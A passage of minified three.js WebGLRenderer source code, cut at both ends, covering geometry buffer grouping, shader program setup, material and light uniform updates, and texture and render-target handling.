0===e.__webglActive)if(e.__webglActive=!0,e instanceof THREE.Mesh){if(i instanceof THREE.BufferGeometry)w(be,i,e);else if(i instanceof THREE.Geometry)for(var n=Ct[i.id],s=0,h=n.length;h>s;s++)w(be,n[s],e)}else e instanceof THREE.Line||e instanceof THREE.PointCloud?w(be,i,e):(e instanceof THREE.ImmediateRenderObject||e.immediateRenderCallback)&&M(_e,e)}function b(e,t){for(var r,i,n=et.get("OES_element_index_uint")?4294967296:65535,a={},o=e.morphTargets.length,s=e.morphNormals.length,h={},l=[],c=0,u=e.faces.length;u>c;c++){var E=e.faces[c],f=t?E.materialIndex:0;f in a||(a[f]={hash:f,counter:0}),r=a[f].hash+"_"+a[f].counter,r in h||(i={id:Lt++,faces3:[],materialIndex:f,vertices:0,numMorphTargets:o,numMorphNormals:s},h[r]=i,l.push(i)),h[r].vertices+3>n&&(a[f].counter+=1,r=a[f].hash+"_"+a[f].counter,r in h||(i={id:Lt++,faces3:[],materialIndex:f,vertices:0,numMorphTargets:o,numMorphNormals:s},h[r]=i,l.push(i))),h[r].faces3.push(c),h[r].vertices+=3}return l}function _(e,t){var r=e.material,n=!1;(void 0===Ct[t.id]||t.groupsNeedUpdate===!0)&&(delete be[e.id],Ct[t.id]=b(t,r instanceof THREE.MeshFaceMaterial),t.groupsNeedUpdate=!1);for(var a=Ct[t.id],o=0,h=a.length;h>o;o++){var l=a[o];void 0===l.__webglVertexBuffer?(i(l),s(l,e),t.verticesNeedUpdate=!0,t.morphTargetsNeedUpdate=!0,t.elementsNeedUpdate=!0,t.uvsNeedUpdate=!0,t.normalsNeedUpdate=!0,t.tangentsNeedUpdate=!0,t.colorsNeedUpdate=!0,n=!0):n=!1,(n||void 0===e.__webglActive)&&w(be,l,e)}e.__webglActive=!0}function w(e,t,r){var i=r.id;e[i]=e[i]||[],e[i].push({id:i,buffer:t,object:r,material:null,z:0})}function M(e,t){e.push({id:null,object:t,opaque:null,transparent:null,z:0})}function S(e){var t=e.geometry;if(t instanceof THREE.BufferGeometry)for(var r=t.attributes,i=t.attributesKeys,n=0,a=i.length;a>n;n++){var o=i[n],s=r[o],l="index"===o?Ce.ELEMENT_ARRAY_BUFFER:Ce.ARRAY_BUFFER;void 0===s.buffer?(s.buffer=Ce.createBuffer(),Ce.bindBuffer(l,s.buffer),Ce.bufferData(l,s.array,s instanceof THREE.DynamicBufferAttribute?Ce.DYNAMIC_DRAW:Ce.STATIC_DRAW),s.needsUpdate=!1):s.needsUpdate===!0&&(Ce.bindBuffer(l,s.buffer),void 0===s.updateRange||-1===s.updateRange.count?Ce.bufferSubData(l,0,s.array):0===s.updateRange.count?console.error("THREE.WebGLRenderer.updateObject: using updateRange for THREE.DynamicBufferAttribute and marked as needsUpdate but count is 0, ensure you are using set methods or updating manually."):(Ce.bufferSubData(l,s.updateRange.offset*s.array.BYTES_PER_ELEMENT,s.array.subarray(s.updateRange.offset,s.updateRange.offset+s.updateRange.count)),s.updateRange.count=0),s.needsUpdate=!1)}else if(e instanceof THREE.Mesh){t.groupsNeedUpdate===!0&&_(e,t);for(var f=Ct[t.id],n=0,p=f.length;p>n;n++){var d=f[n],m=h(e,d),T=m.attributes&&A(m);(t.verticesNeedUpdate||t.morphTargetsNeedUpdate||t.elementsNeedUpdate||t.uvsNeedUpdate||t.normalsNeedUpdate||t.colorsNeedUpdate||t.tangentsNeedUpdate||T)&&E(d,e,Ce.DYNAMIC_DRAW,!t.dynamic,m)}t.verticesNeedUpdate=!1,t.morphTargetsNeedUpdate=!1,t.elementsNeedUpdate=!1,t.uvsNeedUpdate=!1,t.normalsNeedUpdate=!1,t.colorsNeedUpdate=!1,t.tangentsNeedUpdate=!1,m.attributes&&C(m)}else if(e instanceof THREE.Line){var m=h(e,t),T=m.attributes&&A(m);(t.verticesNeedUpdate||t.colorsNeedUpdate||t.lineDistancesNeedUpdate||T)&&u(t,Ce.DYNAMIC_DRAW),t.verticesNeedUpdate=!1,t.colorsNeedUpdate=!1,t.lineDistancesNeedUpdate=!1,m.attributes&&C(m)}else if(e instanceof THREE.PointCloud){var m=h(e,t),T=m.attributes&&A(m);(t.verticesNeedUpdate||t.colorsNeedUpdate||T)&&c(t,Ce.DYNAMIC_DRAW,e),t.verticesNeedUpdate=!1,t.colorsNeedUpdate=!1,m.attributes&&C(m)}}function A(e){for(var t in e.attributes)if(e.attributes[t].needsUpdate)return!0;return!1}function C(e){for(var t in e.attributes)e.attributes[t].needsUpdate=!1}function L(e){e instanceof THREE.Mesh||e instanceof THREE.PointCloud||e instanceof THREE.Line?delete be[e.id]:(e instanceof THREE.ImmediateRenderObject||e.immediateRenderCallback)&&P(_e,e),delete e.__webglInit,delete e._modelViewMatrix,delete e._normalMatrix,delete e.__webglActive}function P(e,t){for(var r=e.length-1;r>=0;r--)e[r].object===t&&e.splice(r,1)}function F(e,t,r,i){e.addEventListener("dispose",bt);var n=Pt[e.type];if(n){var a=THREE.ShaderLib[n];e.__webglShader={uniforms:THREE.UniformsUtils.clone(a.uniforms),vertexShader:a.vertexShader,fragmentShader:a.fragmentShader}}else e.__webglShader={uniforms:e.uniforms,vertexShader:e.vertexShader,fragmentShader:e.fragmentShader};var o=he(t),s=le(t),h=se(i),l={precision:fe,supportsVertexTextures:ht,map:!!e.map,envMap:!!e.envMap,envMapMode:e.envMap&&e.envMap.mapping,lightMap:!!e.lightMap,bumpMap:!!e.bumpMap,normalMap:!!e.normalMap,specularMap:!!e.specularMap,alphaMap:!!e.alphaMap,combine:e.combine,vertexColors:e.vertexColors,fog:r,useFog:e.fog,fogExp:r instanceof THREE.FogExp2,flatShading:e.shading===THREE.FlatShading,sizeAttenuation:e.sizeAttenuation,logarithmicDepthBuffer:Re,skinning:e.skinning,maxBones:h,useVertexTexture:lt&&i&&i.skeleton&&i.skeleton.useVertexTexture,morphTargets:e.morphTargets,morphNormals:e.morphNormals,maxMorphTargets:Le.maxMorphTargets,maxMorphNormals:Le.maxMorphNormals,maxDirLights:o.directional,maxPointLights:o.point,maxSpotLights:o.spot,maxHemiLights:o.hemi,maxShadows:s,shadowMapEnabled:Le.shadowMapEnabled&&i.receiveShadow&&s>0,shadowMapType:Le.shadowMapType,shadowMapDebug:Le.shadowMapDebug,
shadowMapCascade:Le.shadowMapCascade,alphaTest:e.alphaTest,metal:e.metal,wrapAround:e.wrapAround,doubleSided:e.side===THREE.DoubleSide,flipSided:e.side===THREE.BackSide},c=[];if(n?c.push(n):(c.push(e.fragmentShader),c.push(e.vertexShader)),void 0!==e.defines)for(var u in e.defines)c.push(u),c.push(e.defines[u]);for(var u in l)c.push(u),c.push(l[u]);for(var E,f=c.join(),p=0,d=Pe.length;d>p;p++){var m=Pe[p];if(m.code===f){E=m,E.usedTimes++;break}}void 0===E&&(E=new THREE.WebGLProgram(Le,f,e,l),Pe.push(E),Le.info.memory.programs=Pe.length),e.program=E;var T=E.attributes;if(e.morphTargets){e.numSupportedMorphTargets=0;for(var g,v="morphTarget",R=0;R<Le.maxMorphTargets;R++)g=v+R,T[g]>=0&&e.numSupportedMorphTargets++}if(e.morphNormals){e.numSupportedMorphNormals=0;var g,v="morphNormal";for(R=0;R<Le.maxMorphNormals;R++)g=v+R,T[g]>=0&&e.numSupportedMorphNormals++}e.uniformsList=[];for(var y in e.__webglShader.uniforms){var H=e.program.uniforms[y];H&&e.uniformsList.push([e.__webglShader.uniforms[y],H])}}function U(e){e.transparent===!0?$e.setBlending(e.blending,e.blendEquation,e.blendSrc,e.blendDst,e.blendEquationAlpha,e.blendSrcAlpha,e.blendDstAlpha):$e.setBlending(THREE.NoBlending),$e.setDepthTest(e.depthTest),$e.setDepthWrite(e.depthWrite),$e.setColorWrite(e.colorWrite),$e.setPolygonOffset(e.polygonOffset,e.polygonOffsetFactor,e.polygonOffsetUnits)}function B(e,t,r,i,n){ze=0,i.needsUpdate&&(i.program&&At(i),F(i,t,r,n),i.needsUpdate=!1),i.morphTargets&&(n.__webglMorphTargetInfluences||(n.__webglMorphTargetInfluences=new Float32Array(Le.maxMorphTargets)));var a=!1,o=!1,s=!1,h=i.program,l=h.uniforms,c=i.__webglShader.uniforms;if(h.id!==Fe&&(Ce.useProgram(h.program),Fe=h.id,a=!0,o=!0,s=!0),i.id!==Be&&(-1===Be&&(s=!0),Be=i.id,o=!0),(a||e!==Ve)&&(Ce.uniformMatrix4fv(l.projectionMatrix,!1,e.projectionMatrix.elements),Re&&Ce.uniform1f(l.logDepthBufFC,2/(Math.log(e.far+1)/Math.LN2)),e!==Ve&&(Ve=e),(i instanceof THREE.ShaderMaterial||i instanceof THREE.MeshPhongMaterial||i.envMap)&&null!==l.cameraPosition&&(qe.setFromMatrixPosition(e.matrixWorld),Ce.uniform3f(l.cameraPosition,qe.x,qe.y,qe.z)),(i instanceof THREE.MeshPhongMaterial||i instanceof THREE.MeshLambertMaterial||i instanceof THREE.MeshBasicMaterial||i instanceof THREE.ShaderMaterial||i.skinning)&&null!==l.viewMatrix&&Ce.uniformMatrix4fv(l.viewMatrix,!1,e.matrixWorldInverse.elements)),i.skinning)if(n.bindMatrix&&null!==l.bindMatrix&&Ce.uniformMatrix4fv(l.bindMatrix,!1,n.bindMatrix.elements),n.bindMatrixInverse&&null!==l.bindMatrixInverse&&Ce.uniformMatrix4fv(l.bindMatrixInverse,!1,n.bindMatrixInverse.elements),lt&&n.skeleton&&n.skeleton.useVertexTexture){if(null!==l.boneTexture){var u=q();Ce.uniform1i(l.boneTexture,u),Le.setTexture(n.skeleton.boneTexture,u)}null!==l.boneTextureWidth&&Ce.uniform1i(l.boneTextureWidth,n.skeleton.boneTextureWidth),null!==l.boneTextureHeight&&Ce.uniform1i(l.boneTextureHeight,n.skeleton.boneTextureHeight)}else n.skeleton&&n.skeleton.boneMatrices&&null!==l.boneGlobalMatrices&&Ce.uniformMatrix4fv(l.boneGlobalMatrices,!1,n.skeleton.boneMatrices);return o&&(r&&i.fog&&N(c,r),(i instanceof THREE.MeshPhongMaterial||i instanceof THREE.MeshLambertMaterial||i.lights)&&(Ke&&(s=!0,Z(t),Ke=!1),s?(I(c,Qe),W(c,!0)):W(c,!1)),(i instanceof THREE.MeshBasicMaterial||i instanceof THREE.MeshLambertMaterial||i instanceof THREE.MeshPhongMaterial)&&D(c,i),i instanceof THREE.LineBasicMaterial?V(c,i):i instanceof THREE.LineDashedMaterial?(V(c,i),z(c,i)):i instanceof THREE.PointCloudMaterial?k(c,i):i instanceof THREE.MeshPhongMaterial?O(c,i):i instanceof THREE.MeshLambertMaterial?G(c,i):i instanceof THREE.MeshDepthMaterial?(c.mNear.value=e.near,c.mFar.value=e.far,c.opacity.value=i.opacity):i instanceof THREE.MeshNormalMaterial&&(c.opacity.value=i.opacity),n.receiveShadow&&!i._shadowPass&&j(c,t),Y(i.uniformsList)),X(l,n),null!==l.modelMatrix&&Ce.uniformMatrix4fv(l.modelMatrix,!1,n.matrixWorld.elements),h}function D(e,t){e.opacity.value=t.opacity,e.diffuse.value=t.color,e.map.value=t.map,e.lightMap.value=t.lightMap,e.specularMap.value=t.specularMap,e.alphaMap.value=t.alphaMap,t.bumpMap&&(e.bumpMap.value=t.bumpMap,e.bumpScale.value=t.bumpScale),t.normalMap&&(e.normalMap.value=t.normalMap,e.normalScale.value.copy(t.normalScale));var r;if(t.map?r=t.map:t.specularMap?r=t.specularMap:t.normalMap?r=t.normalMap:t.bumpMap?r=t.bumpMap:t.alphaMap&&(r=t.alphaMap),void 0!==r){var i=r.offset,n=r.repeat;e.offsetRepeat.value.set(i.x,i.y,n.x,n.y)}e.envMap.value=t.envMap,e.flipEnvMap.value=t.envMap instanceof THREE.WebGLRenderTargetCube?1:-1,e.reflectivity.value=t.reflectivity,e.refractionRatio.value=t.refractionRatio}function V(e,t){e.diffuse.value=t.color,e.opacity.value=t.opacity}function z(e,t){e.dashSize.value=t.dashSize,e.totalSize.value=t.dashSize+t.gapSize,e.scale.value=t.scale}function k(e,t){if(e.psColor.value=t.color,e.opacity.value=t.opacity,e.size.value=t.size,e.scale.value=ce.height/2,e.map.value=t.map,null!==t.map){var r=t.map.offset,i=t.map.repeat;e.offsetRepeat.value.set(r.x,r.y,i.x,i.y)}}function N(e,t){e.fogColor.value=t.color,t instanceof THREE.Fog?(e.fogNear.value=t.near,e.fogFar.value=t.far):t instanceof THREE.FogExp2&&(e.fogDensity.value=t.density)}function O(e,t){e.shininess.value=t.shininess,e.emissive.value=t.emissive,e.specular.value=t.specular,t.wrapAround&&e.wrapRGB.value.copy(t.wrapRGB)}function G(e,t){e.emissive.value=t.emissive,t.wrapAround&&e.wrapRGB.value.copy(t.wrapRGB)}function I(e,t){e.ambientLightColor.value=t.ambient,e.directionalLightColor.value=t.directional.colors,e.directionalLightDirection.value=t.directional.positions,e.pointLightColor.value=t.point.colors,e.pointLightPosition.value=t.point.positions,e.pointLightDistance.value=t.point.distances,e.pointLightDecay.value=t.point.decays,e.spotLightColor.value=t.spot.colors,e.spotLightPosition.value=t.spot.positions,e.spotLightDistance.value=t.spot.distances,e.spotLightDirection.value=t.spot.directions,e.spotLightAngleCos.value=t.spot.anglesCos,e.spotLightExponent.value=t.spot.exponents,e.spotLightDecay.value=t.spot.decays,e.hemisphereLightSkyColor.value=t.hemi.skyColors,e.hemisphereLightGroundColor.value=t.hemi.groundColors,e.hemisphereLightDirection.value=t.hemi.positions}function W(e,t){e.ambientLightColor.needsUpdate=t,e.directionalLightColor.needsUpdate=t,e.directionalLightDirection.needsUpdate=t,e.pointLightColor.needsUpdate=t,e.pointLightPosition.needsUpdate=t,e.pointLightDistance.needsUpdate=t,e.pointLightDecay.needsUpdate=t,e.spotLightColor.needsUpdate=t,e.spotLightPosition.needsUpdate=t,e.spotLightDistance.needsUpdate=t,e.spotLightDirection.needsUpdate=t,e.spotLightAngleCos.needsUpdate=t,e.spotLightExponent.needsUpdate=t,e.spotLightDecay.needsUpdate=t,e.hemisphereLightSkyColor.needsUpdate=t,e.hemisphereLightGroundColor.needsUpdate=t,e.hemisphereLightDirection.needsUpdate=t}function j(e,t){if(e.shadowMatrix)for(var r=0,i=0,n=t.length;n>i;i++){var a=t[i];a.castShadow&&(a instanceof THREE.SpotLight||a instanceof THREE.DirectionalLight&&!a.shadowCascade)&&(e.shadowMap.value[r]=a.shadowMap,e.shadowMapSize.value[r]=a.shadowMapSize,e.shadowMatrix.value[r]=a.shadowMatrix,e.shadowDarkness.value[r]=a.shadowDarkness,e.shadowBias.value[r]=a.shadowBias,r++)}}function X(e,t){Ce.uniformMatrix4fv(e.modelViewMatrix,!1,t._modelViewMatrix.elements),e.normalMatrix&&Ce.uniformMatrix3fv(e.normalMatrix,!1,t._normalMatrix.elements)}function q(){var e=ze;return e>=nt&&THREE.warn("WebGLRenderer: trying to use "+e+" texture units while this GPU supports only "+nt),ze+=1,e}function Y(e){for(var t,r,i,n=0,a=e.length;a>n;n++){var o=e[n][0];if(o.needsUpdate!==!1){var s=o.type,h=o.value,l=e[n][1];switch(s){case"1i":Ce.uniform1i(l,h);break;case"1f":Ce.uniform1f(l,h);break;case"2f":Ce.uniform2f(l,h[0],h[1]);break;case"3f":Ce.uniform3f(l,h[0],h[1],h[2]);break;case"4f":Ce.uniform4f(l,h[0],h[1],h[2],h[3]);break;case"1iv":Ce.uniform1iv(l,h);break;case"3iv":Ce.uniform3iv(l,h);break;case"1fv":Ce.uniform1fv(l,h);break;case"2fv":Ce.uniform2fv(l,h);break;case"3fv":Ce.uniform3fv(l,h);break;case"4fv":Ce.uniform4fv(l,h);break;case"Matrix3fv":Ce.uniformMatrix3fv(l,!1,h);break;case"Matrix4fv":Ce.uniformMatrix4fv(l,!1,h);break;case"i":Ce.uniform1i(l,h);break;case"f":Ce.uniform1f(l,h);break;case"v2":Ce.uniform2f(l,h.x,h.y);break;case"v3":Ce.uniform3f(l,h.x,h.y,h.z);break;case"v4":Ce.uniform4f(l,h.x,h.y,h.z,h.w);break;case"c":Ce.uniform3f(l,h.r,h.g,h.b);break;case"iv1":Ce.uniform1iv(l,h);break;case"iv":Ce.uniform3iv(l,h);break;case"fv1":Ce.uniform1fv(l,h);break;case"fv":Ce.uniform3fv(l,h);break;case"v2v":void 0===o._array&&(o._array=new Float32Array(2*h.length));for(var c=0,u=h.length;u>c;c++)i=2*c,o._array[i]=h[c].x,o._array[i+1]=h[c].y;Ce.uniform2fv(l,o._array);break;case"v3v":void 0===o._array&&(o._array=new Float32Array(3*h.length));for(var c=0,u=h.length;u>c;c++)i=3*c,o._array[i]=h[c].x,o._array[i+1]=h[c].y,o._array[i+2]=h[c].z;Ce.uniform3fv(l,o._array);break;case"v4v":void 0===o._array&&(o._array=new Float32Array(4*h.length));for(var c=0,u=h.length;u>c;c++)i=4*c,o._array[i]=h[c].x,o._array[i+1]=h[c].y,o._array[i+2]=h[c].z,o._array[i+3]=h[c].w;Ce.uniform4fv(l,o._array);break;case"m3":Ce.uniformMatrix3fv(l,!1,h.elements);break;case"m3v":void 0===o._array&&(o._array=new Float32Array(9*h.length));for(var c=0,u=h.length;u>c;c++)h[c].flattenToArrayOffset(o._array,9*c);Ce.uniformMatrix3fv(l,!1,o._array);break;case"m4":Ce.uniformMatrix4fv(l,!1,h.elements);break;case"m4v":void 0===o._array&&(o._array=new Float32Array(16*h.length));for(var c=0,u=h.length;u>c;c++)h[c].flattenToArrayOffset(o._array,16*c);Ce.uniformMatrix4fv(l,!1,o._array);break;case"t":if(t=h,r=q(),Ce.uniform1i(l,r),!t)continue;t instanceof THREE.CubeTexture||t.image instanceof Array&&6===t.image.length?ee(t,r):t instanceof THREE.WebGLRenderTargetCube?te(t,r):Le.setTexture(t,r);break;case"tv":void 0===o._array&&(o._array=[]);for(var c=0,u=o.value.length;u>c;c++)o._array[c]=q();Ce.uniform1iv(l,o._array);for(var c=0,u=o.value.length;u>c;c++)t=o.value[c],r=o._array[c],t&&Le.setTexture(t,r);break;default:THREE.warn("THREE.WebGLRenderer: Unknown uniform type: "+s)}}}}function K(e,t){e._modelViewMatrix.multiplyMatrices(t.matrixWorldInverse,e.matrixWorld),e._normalMatrix.getNormalMatrix(e._modelViewMatrix)}function Q(e,t,r,i){e[t]=r.r*i,e[t+1]=r.g*i,e[t+2]=r.b*i}function Z(e){var t,r,i,n,a,o,s,h,l=0,c=0,u=0,E=Qe,f=E.directional.colors,p=E.directional.positions,d=E.point.colors,m=E.point.positions,T=E.point.distances,g=E.point.decays,v=E.spot.colors,R=E.spot.positions,y=E.spot.distances,H=E.spot.directions,x=E.spot.anglesCos,b=E.spot.exponents,_=E.spot.decays,w=E.hemi.skyColors,M=E.hemi.groundColors,S=E.hemi.positions,A=0,C=0,L=0,P=0,F=0,U=0,B=0,D=0,V=0,z=0,k=0,N=0;for(t=0,r=e.length;r>t;t++)if(i=e[t],!i.onlyShadow)if(n=i.color,s=i.intensity,h=i.distance,i instanceof THREE.AmbientLight){if(!i.visible)continue;l+=n.r,c+=n.g,u+=n.b}else if(i instanceof THREE.DirectionalLight){if(F+=1,!i.visible)continue;Ye.setFromMatrixPosition(i.matrixWorld),qe.setFromMatrixPosition(i.target.matrixWorld),Ye.sub(qe),Ye.normalize(),V=3*A,p[V]=Ye.x,p[V+1]=Ye.y,p[V+2]=Ye.z,Q(f,V,n,s),A+=1}else if(i instanceof THREE.PointLight){if(U+=1,!i.visible)continue;z=3*C,Q(d,z,n,s),qe.setFromMatrixPosition(i.matrixWorld),m[z]=qe.x,m[z+1]=qe.y,m[z+2]=qe.z,T[C]=h,g[C]=0===i.distance?0:i.decay,C+=1}else if(i instanceof THREE.SpotLight){if(B+=1,!i.visible)continue;k=3*L,Q(v,k,n,s),Ye.setFromMatrixPosition(i.matrixWorld),R[k]=Ye.x,R[k+1]=Ye.y,R[k+2]=Ye.z,y[L]=h,qe.setFromMatrixPosition(i.target.matrixWorld),Ye.sub(qe),Ye.normalize(),H[k]=Ye.x,H[k+1]=Ye.y,H[k+2]=Ye.z,x[L]=Math.cos(i.angle),b[L]=i.exponent,_[L]=0===i.distance?0:i.decay,L+=1}else if(i instanceof THREE.HemisphereLight){if(D+=1,!i.visible)continue;Ye.setFromMatrixPosition(i.matrixWorld),Ye.normalize(),N=3*P,S[N]=Ye.x,S[N+1]=Ye.y,S[N+2]=Ye.z,a=i.color,o=i.groundColor,Q(w,N,a,s),Q(M,N,o,s),P+=1}for(t=3*A,r=Math.max(f.length,3*F);r>t;t++)f[t]=0;for(t=3*C,r=Math.max(d.length,3*U);r>t;t++)d[t]=0;for(t=3*L,r=Math.max(v.length,3*B);r>t;t++)v[t]=0;for(t=3*P,r=Math.max(w.length,3*D);r>t;t++)w[t]=0;for(t=3*P,r=Math.max(M.length,3*D);r>t;t++)M[t]=0;E.directional.length=A,E.point.length=C,E.spot.length=L,E.hemi.length=P,E.ambient[0]=l,E.ambient[1]=c,E.ambient[2]=u}function J(e,t,r){var i;r?(Ce.texParameteri(e,Ce.TEXTURE_WRAP_S,oe(t.wrapS)),Ce.texParameteri(e,Ce.TEXTURE_WRAP_T,oe(t.wrapT)),Ce.texParameteri(e,Ce.TEXTURE_MAG_FILTER,oe(t.magFilter)),Ce.texParameteri(e,Ce.TEXTURE_MIN_FILTER,oe(t.minFilter))):(Ce.texParameteri(e,Ce.TEXTURE_WRAP_S,Ce.CLAMP_TO_EDGE),Ce.texParameteri(e,Ce.TEXTURE_WRAP_T,Ce.CLAMP_TO_EDGE),(t.wrapS!==THREE.ClampToEdgeWrapping||t.wrapT!==THREE.ClampToEdgeWrapping)&&THREE.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping. ( "+t.sourceFile+" )"),Ce.texParameteri(e,Ce.TEXTURE_MAG_FILTER,ae(t.magFilter)),Ce.texParameteri(e,Ce.TEXTURE_MIN_FILTER,ae(t.minFilter)),t.minFilter!==THREE.NearestFilter&&t.minFilter!==THREE.LinearFilter&&THREE.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter. ( "+t.sourceFile+" )")),i=et.get("EXT_texture_filter_anisotropic"),i&&t.type!==THREE.FloatType&&t.type!==THREE.HalfFloatType&&(t.anisotropy>1||t.__currentAnisotropy)&&(Ce.texParameterf(e,i.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(t.anisotropy,Le.getMaxAnisotropy())),t.__currentAnisotropy=t.anisotropy)}function $(e,t){if(e.width>t||e.height>t){var r=t/Math.max(e.width,e.height),i=document.createElement("canvas");i.width=Math.floor(e.width*r),i.height=Math.floor(e.height*r);var n=i.getContext("2d");return n.drawImage(e,0,0,e.width,e.height,0,0,i.width,i.height),THREE.warn("THREE.WebGLRenderer: image is too big ("+e.width+"x"+e.height+"). Resized to "+i.width+"x"+i.height,e),i}return e}function ee(e,t){if(6===e.image.length)if(e.needsUpdate){e.image.__webglTextureCube||(e.addEventListener("dispose",Ht),e.image.__webglTextureCube=Ce.createTexture(),Le.info.memory.textures++),Ce.activeTexture(Ce.TEXTURE0+t),Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,e.image.__webglTextureCube),Ce.pixelStorei(Ce.UNPACK_FLIP_Y_WEBGL,e.flipY);for(var r=e instanceof THREE.CompressedTexture,i=e.image[0]instanceof THREE.DataTexture,n=[],a=0;6>a;a++)!Le.autoScaleCubemaps||r||i?n[a]=i?e.image[a].image:e.image[a]:n[a]=$(e.image[a],st);var o=n[0],s=THREE.Math.isPowerOfTwo(o.width)&&THREE.Math.isPowerOfTwo(o.height),h=oe(e.format),l=oe(e.type);J(Ce.TEXTURE_CUBE_MAP,e,s);for(var a=0;6>a;a++)if(r)for(var c,u=n[a].mipmaps,E=0,f=u.length;f>E;E++)c=u[E],e.format!==THREE.RGBAFormat&&e.format!==THREE.RGBFormat?pt().indexOf(h)>-1?Ce.compressedTexImage2D(Ce.TEXTURE_CUBE_MAP_POSITIVE_X+a,E,h,c.width,c.height,0,c.data):THREE.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setCubeTexture()"):Ce.texImage2D(Ce.TEXTURE_CUBE_MAP_POSITIVE_X+a,E,h,c.width,c.height,0,h,l,c.data);else i?Ce.texImage2D(Ce.TEXTURE_CUBE_MAP_POSITIVE_X+a,0,h,n[a].width,n[a].height,0,h,l,n[a].data):Ce.texImage2D(Ce.TEXTURE_CUBE_MAP_POSITIVE_X+a,0,h,h,l,n[a]);e.generateMipmaps&&s&&Ce.generateMipmap(Ce.TEXTURE_CUBE_MAP),e.needsUpdate=!1,e.onUpdate&&e.onUpdate()}else Ce.activeTexture(Ce.TEXTURE0+t),Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,e.image.__webglTextureCube)}function te(e,t){Ce.activeTexture(Ce.TEXTURE0+t),Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,e.__webglTexture)}function re(e,t,r){Ce.bindFramebuffer(Ce.FRAMEBUFFER,e),Ce.framebufferTexture2D(Ce.FRAMEBUFFER,Ce.COLOR_ATTACHMENT0,r,t.__webglTexture,0)}function ie(e,t){Ce.bindRenderbuffer(Ce.RENDERBUFFER,e),t.depthBuffer&&!t.stencilBuffer?(Ce.renderbufferStorage(Ce.RENDERBUFFER,Ce.DEPTH_COMPONENT16,t.width,t.height),Ce.framebufferRenderbuffer(Ce.FRAMEBUFFER,Ce.DEPTH_ATTACHMENT,Ce.RENDERBUFFER,e)):t.depthBuffer&&t.stencilBuffer?(Ce.renderbufferStorage(Ce.RENDERBUFFER,Ce.DEPTH_STENCIL,t.width,t.height),Ce.framebufferRenderbuffer(Ce.FRAMEBUFFER,Ce.DEPTH_STENCIL_ATTACHMENT,Ce.RENDERBUFFER,e)):Ce.renderbufferStorage(Ce.RENDERBUFFER,Ce.RGBA4,t.width,t.height)}function ne(e){e instanceof THREE.WebGLRenderTargetCube?(Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,e.__webglTexture),Ce.generateMipmap(Ce.TEXTURE_CUBE_MAP),Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,null)):(Ce.bindTexture(Ce.TEXTURE_2D,e.__webglTexture),Ce.generateMipmap(Ce.TEXTURE_2D),Ce.bindTexture(Ce.TEXTURE_2D,null))}function ae(e){return e===THREE.NearestFilter||e===THREE.NearestMipMapNearestFilter||e===THREE.NearestMipMapLinearFilter?Ce.NEAREST:Ce.LINEAR}function oe(e){var t;if(e===THREE.RepeatWrapping)return Ce.REPEAT;if(e===THREE.ClampToEdgeWrapping)return Ce.CLAMP_TO_EDGE;if(e===THREE.MirroredRepeatWrapping)return Ce.MIRRORED_REPEAT;if(e===THREE.NearestFilter)return Ce.NEAREST;if(e===THREE.NearestMipMapNearestFilter)return Ce.NEAREST_MIPMAP_NEAREST;if(e===THREE.NearestMipMapLinearFilter)return Ce.NEAREST_MIPMAP_LINEAR;if(e===THREE.LinearFilter)return Ce.LINEAR;if(e===THREE.LinearMipMapNearestFilter)return Ce.LINEAR_MIPMAP_NEAREST;if(e===THREE.LinearMipMapLinearFilter)return Ce.LINEAR_MIPMAP_LINEAR;if(e===THREE.UnsignedByteType)return Ce.UNSIGNED_BYTE;if(e===THREE.UnsignedShort4444Type)return Ce.UNSIGNED_SHORT_4_4_4_4;if(e===THREE.UnsignedShort5551Type)return Ce.UNSIGNED_SHORT_5_5_5_1;if(e===THREE.UnsignedShort565Type)return Ce.UNSIGNED_SHORT_5_6_5;if(e===THREE.ByteType)return Ce.BYTE;if(e===THREE.ShortType)return Ce.SHORT;if(e===THREE.UnsignedShortType)return Ce.UNSIGNED_SHORT;if(e===THREE.IntType)return Ce.INT;if(e===THREE.UnsignedIntType)return Ce.UNSIGNED_INT;if(e===THREE.FloatType)return Ce.FLOAT;if(t=et.get("OES_texture_half_float"),null!==t&&e===THREE.HalfFloatType)return t.HALF_FLOAT_OES;if(e===THREE.AlphaFormat)return Ce.ALPHA;if(e===THREE.RGBFormat)return Ce.RGB;if(e===THREE.RGBAFormat)return Ce.RGBA;if(e===THREE.LuminanceFormat)return Ce.LUMINANCE;if(e===THREE.LuminanceAlphaFormat)return Ce.LUMINANCE_ALPHA;if(e===THREE.AddEquation)return Ce.FUNC_ADD;if(e===THREE.SubtractEquation)return Ce.FUNC_SUBTRACT;if(e===THREE.ReverseSubtractEquation)return Ce.FUNC_REVERSE_SUBTRACT;if(e===THREE.ZeroFactor)return Ce.ZERO;if(e===THREE.OneFactor)return Ce.ONE;if(e===THREE.SrcColorFactor)return Ce.SRC_COLOR;if(e===THREE.OneMinusSrcColorFactor)return Ce.ONE_MINUS_SRC_COLOR;if(e===THREE.SrcAlphaFactor)return Ce.SRC_ALPHA;if(e===THREE.OneMinusSrcAlphaFactor)return Ce.ONE_MINUS_SRC_ALPHA;if(e===THREE.DstAlphaFactor)return Ce.DST_ALPHA;if(e===THREE.OneMinusDstAlphaFactor)return Ce.ONE_MINUS_DST_ALPHA;if(e===THREE.DstColorFactor)return Ce.DST_COLOR;if(e===THREE.OneMinusDstColorFactor)return Ce.ONE_MINUS_DST_COLOR;if(e===THREE.SrcAlphaSaturateFactor)return Ce.SRC_ALPHA_SATURATE;if(t=et.get("WEBGL_compressed_texture_s3tc"),null!==t){if(e===THREE.RGB_S3TC_DXT1_Format)return t.COMPRESSED_RGB_S3TC_DXT1_EXT;if(e===THREE.RGBA_S3TC_DXT1_Format)return t.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(e===THREE.RGBA_S3TC_DXT3_Format)return t.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(e===THREE.RGBA_S3TC_DXT5_Format)return 